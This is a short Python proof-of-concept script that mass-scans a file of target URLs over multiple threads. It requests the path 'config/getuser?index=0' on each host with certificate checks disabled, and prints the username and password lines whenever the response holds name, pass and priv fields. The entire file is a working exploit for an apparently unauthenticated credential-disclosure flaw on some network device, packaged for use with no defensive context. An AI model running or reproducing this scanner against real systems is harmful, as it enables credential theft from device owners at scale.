# coding=UTF-8

import requests
import sys
import getopt
import math
import threading
import re

requests.packages.urllib3.disable_warnings()
payload = "config/getuser?index=0"
#def usage():
#    print("python3 poc.py -t threads -u urls.txt")

def start():
    if len(sys.argv) == 5 :
        opts, args = getopt.getopt(sys.argv[1:], "t:u:")
        for k,v in opts:
            if k == "-t":
                threads = v
            elif k == "-u":
                dic = v
        m_scan(payload,threads,dic)
    else:
        print("python3 poc.py -t threads -u urls.txt")
        

def m_scan(payload,threads,dic):
    result_list = []
    threads_list= []
    with open (dic,"r") as f:
        dic_list = f.readlines()
           

        if len(dic_list) % int(threads) == 0:
            threads_read_line_num = len(dic_list) / int(threads)
        else:
            threads_read_line_num = math.ceil(len(dic_list) / int(threads))
        
        i=0
        temp_list = []
        for line in dic_list:
            i=i+1
            if i % threads_read_line_num == 0:
                temp_list.append(line.strip())
                result_list.append(temp_list)
                temp_list = []
            else:
                temp_list.append(line.strip())
    
    for i in result_list:
        threads_list.append(threading.Thread(target=scan, args=(payload,i)))   
    for t in threads_list:
        t.start()

#test_0 = "config/getuser"
#test_1 = {'index:0'}

def scan(payload,dic):
    for line in dic:
        if ('http://' in line) or ('https://' in line):
            pass
        else:
            line = 'http://'+line
        try:
            r = requests.get(line+'/'+payload,timeout=8,verify=False)
            if "name" in r.text and "pass" in r.text and "priv" in r.text and r.status_code == 200:
                poc = r.text.split('\r\n')   
                print("%s %s&%s" %(line,poc[0],poc[1]))
                print("--------------------------------------------------------")
               

            else:
                print(line+"  not  found")
        except:
            pass


                





if __name__ =="__main__":
    start()
     
       
